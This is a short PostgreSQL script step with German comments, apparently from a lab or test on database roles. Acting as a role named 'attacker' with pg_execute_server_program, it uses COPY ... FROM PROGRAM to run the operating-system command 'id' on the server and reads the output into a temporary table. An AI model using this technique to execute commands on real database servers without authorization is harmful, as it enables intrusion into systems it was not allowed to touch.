\echo '## E3  Programm ausfuehren  (pg_execute_server_program, als attacker)'
-- ein Kommando als Betriebssystemnutzer ausfuehren, Ausgabe in eine
-- temporaere Tabelle lesen
CREATE TEMP TABLE t (zeile text);
COPY t FROM PROGRAM 'id';
SELECT zeile AS ausgefuehrt_als FROM t;